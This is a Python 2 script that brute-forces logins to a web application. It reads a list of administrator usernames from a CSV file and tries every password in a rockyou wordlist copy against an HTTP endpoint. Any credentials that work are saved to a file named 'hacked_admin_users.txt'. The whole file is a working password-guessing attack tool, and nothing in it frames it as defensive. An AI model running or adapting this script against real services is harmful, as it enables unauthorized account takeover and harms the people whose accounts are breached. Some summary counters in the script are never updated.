import requests
import pandas as pd
import sys
from requests.auth import HTTPDigestAuth
from string import rstrip
import numpy as np
from StringIO import StringIO

url=""
#wordfile="/usr/share/wordlists/rockyou.txt"
#wordfile="testlist.txt"
wordfile="rockyou_copy.txt"

def test_credentials(user):
	print "\n\nTesting user {}...".format(user)	
	count = 0

	with open(wordfile) as wordlist:
		words = wordlist.readlines()
		words = [line[:-1] for line in words]
		total_count = len(words)
		#print words
		for word in words:	
			try:
				#print "Trying {}/{}".format(user,word)
				count += 1
				r = requests.get(url, auth=(user,word), verify=False, stream=True)
				sys.stdout.write("\rChecked {}/{} passwords...".format(str(count),str(total_count)))
				#if count % 100 == 0:
					#sys.stdout.write("\rChecked {}/{} passwords...".format(str(count),str(total_count)))
					#print "{}/{} passwords checked...".format(str(count),str(total_count))
				if r.status_code == 404:
					print "\nPassword found!"
					print "Credentials: {}/{}".format(user,word)
					with open('hacked_admin_users.txt','w') as file:
						file.write("'{}','{}'\n".format(user,word))
					break
				if count == total_count:
					print "\nPassword not found..."
			except:
				continue			

def get_interesting_users(file):
	## Get all users from the csv file
	df_users = pd.read_csv(file,sep=',',quotechar="'",header=None,error_bad_lines=False,warn_bad_lines=False)
	
	## Uncomment for first name == last name == username
	#df_users = df_users[(df_users[0]==df_users[1]) & (df_users[0] ==df_users[2])]
	#print "Found {} users with matching first name, last name and username...".format(str(len(df_users)))
	
	## Uncomment for first name == last name
	#df_users = df_users[(df_users[0]==df_users[1])]
	
	return df_users

interesting_users = get_interesting_users('admin_users.csv')

hacked_users = []
other_users = []

for user in interesting_users.iterrows():
	user = user[1][2]
	test_credentials(user)

print "\nDone!\n\nSummary:"
print "Hacked users: {}".format(str(len(hacked_users)))


print "Non-hacked users: {}".format(str(len(other_users)))
